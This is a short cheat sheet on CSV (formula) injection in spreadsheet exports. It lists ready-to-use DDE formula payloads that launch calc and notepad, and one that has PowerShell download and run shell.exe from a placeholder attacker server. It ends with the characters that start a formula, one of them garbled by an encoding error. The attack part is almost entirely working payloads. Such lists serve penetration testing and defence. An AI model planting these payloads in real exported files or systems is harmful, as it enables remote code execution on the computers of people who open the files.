# CSV Injection (Formula Injection)

Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel,Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.

## Exploit

Basic exploit with Dynamic Data Exchange

```powershell
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
```

Technical Details of the above payload:

- `cmd` is the name the server can respond to whenever a client is trying to access the server
- `/C` calc is the file name which in our case is the calc(i.e the calc.exe)
- `!A0` is the item name that specifies unit of data that a server can respond when the client is requesting the data

Any formula can be started with

```powershell
=
+
â€“
@
```
